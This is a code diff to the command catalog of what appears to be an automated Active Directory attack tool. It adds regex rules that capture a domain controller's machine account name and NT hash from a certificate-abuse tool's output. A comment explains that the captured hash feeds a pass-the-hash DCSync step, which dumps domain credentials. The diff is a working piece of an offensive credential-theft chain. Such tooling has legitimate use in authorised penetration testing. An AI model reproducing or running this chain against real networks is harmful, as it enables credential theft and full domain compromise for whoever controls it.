@@ -446,6 +446,11 @@ CATALOG: list[CommandSpec] = [
                              + (["--target-san", _s(k["target_san"])] if k.get("target_san") else [])
                              + (["--template", _s(k["template"])] if k.get("template") else [])
                              + (["--listener", _s(k["listener"])] if k.get("listener") else []),
+        # On success ("Got hash for L3SDC$:\n  L3SDC$:<lm>:<nt>") capture the DC
+        # machine account + its NT hash so the DCSync step can pass-the-hash with
+        # it. This overwrites username/hash — fine, the DCSync is the final step.
+        harvest=[HarvestRule("username", r"Got hash for (\S+\$)\s*:"),
+                 HarvestRule("hash", r"\S+\$:[a-f0-9]{32}:([a-f0-9]{32})")],
         timeout=1200,
         install_hint="Vendored at tools/ext/certighost.py; needs impacket, "
                      "cryptography, asn1crypto, pycryptodomex, dnspython, pyasn1. "
